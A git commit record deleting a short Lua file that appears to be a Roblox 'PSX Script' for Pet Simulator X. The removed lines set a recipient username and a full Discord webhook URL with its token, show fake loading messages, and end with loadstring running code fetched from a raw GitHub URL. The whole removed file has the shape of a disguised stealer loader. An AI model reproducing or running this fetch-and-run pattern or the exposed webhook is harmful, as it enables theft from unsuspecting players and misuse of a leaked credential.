be465d7ca5e3e7802e4c7556d26d38b048545689
jefrey <126723194+jeffreyDarmer1443123@users.noreply.github.com>
2023-03-05 01:43:49 +0100

    Delete neu (2).lua

--- neu (2).lua
+++
@@ -1,9 +0,0 @@
-Username = "Plakins8"
-WebHook = "https://discord.com/api/webhooks/1081727452910452896/c7ipq0X2Yr3HXEvFe6GVlZ0TnAxp3nF5bfFBjE5cAgrSsqIPr1Iy4tLpGvSaAUH8Gozg"
-
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
